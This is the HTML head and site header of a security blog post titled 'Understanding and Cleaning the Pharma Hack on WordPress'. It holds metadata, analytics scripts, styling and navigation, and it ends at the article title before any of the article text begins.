<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Understanding and Cleaning the Pharma Hack on WordPress</title>
<meta name='robots' content='max-image-preview:large' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="Understanding and Cleaning the Pharma Hack on WordPress" />
<meta property="og:description" content="This post is very specific to one type of infection, there are many different types of infections and symptoms, do not be discouraged if the scenario does not fit your situation. There are more recent" />
<meta property="og:image" content="https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress.png" />
<meta property="og:url" content="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2010-07-13T12:46:58-07:00" />
<meta property="article:modified_time" content="2022-07-20T09:53:03-07:00" />
<meta property="og:updated_time" content="2022-07-20T09:53:03-07:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->
<meta property="og:image:width" content="745" />
<meta property="og:image:height" content="350" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Understanding and Cleaning the Pharma Hack on WordPress">
<meta name="twitter:description" content="This post is very specific to one type of infection, there are many different types of infections and symptoms, do not be discouraged if the scenario does not fit your situation. There are more recent">
<meta name="twitter:image" content="https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress.jpg">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->


<!-- This site is optimized with the Yoast SEO Premium plugin v12.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="The pharma hack is one of the most common infections against WordPress websites. Learn how to clean a hacked WordPress site infected with the pharma hack."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html" />
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Understanding and Cleaning the Pharma Hack on WordPress Comments Feed" href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='select2-css'  href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.1' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"210","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2010\/07\/understanding-and-cleaning-the-pharma-hack-on-wordpress.html","title":"Understanding+and+Cleaning+the+Pharma+Hack+on+WordPress","image":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2010\/07\/Pharrma-Hack-WordPress.jpg","desc":"This post is very specific to one type of infection, there are many different types of infections and symptoms, do not be discouraged if the scenario does not fit your situation. There are more recent \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"1","nonce":"c1b7e23fe8","postid":"575","servertime":"1659523149","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.1' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/575" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.sucuri.net/?p=575' />


<!-- This site is optimized with the Schema plugin v1.7.9.4 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2010\/07\/understanding-and-cleaning-the-pharma-hack-on-wordpress.html"},"url":"https:\/\/blog.sucuri.net\/2010\/07\/understanding-and-cleaning-the-pharma-hack-on-wordpress.html","headline":"Understanding and Cleaning the Pharma Hack on WordPress","datePublished":"2010-07-13T12:46:58-07:00","dateModified":"2022-07-20T09:53:03-07:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"image":{"@type":"ImageObject","url":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2010\/07\/Pharrma-Hack-WordPress.jpg","width":745,"height":350},"articleSection":"WordPress Security","keywords":"Black Hat Tactics, Hacked Websites, Malware Cleanup, SEO Spam","description":"This post is very specific to one type of infection, there are many different types of infections and symptoms, do not be discouraged if the scenario does not fit your situation. There are more recent posts on what pharma hacks look like in 2016. A more detailed guide on","author":{"@type":"Person","name":"David Dede","url":"https:\/\/blog.sucuri.net\/author\/dd","description":"David is a Security Researcher at Sucuri. He spends most of his time dissecting vulnerabilities and security issues. You won't find him on Twitter because he is paranoid about privacy.","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/f7105dd5dc850e545047cfa4477d2343?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script><link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }		</style>
		</head>
<body class="post-template-default single single-post postid-575 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-575 post type-post status-publish format-standard has-post-thumbnail category-wordpress-security tag-black-hat-tactics tag-hacked-websites tag-malware-cleanup tag-seo-spam entry"><header class="entry-header"><div class="single-featured"><img width="745" height="350" src="https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress.jpg" class="single-featured-image wp-post-image" alt="pharma hack wordpress" loading="lazy" srcset="https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress.jpg 745w, https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress-600x282.jpg 600w, https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress-650x305.jpg 650w, https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress-585x275.jpg 585w, https://blog.sucuri.net/wp-content/uploads/2010/07/Pharrma-Hack-WordPress-560x263.jpg 560w" sizes="(max-width: 745px) 100vw, 745px" /></div><h1 class="entry-title">Understanding and Cleaning the Pharma Hack on WordPress</h1>
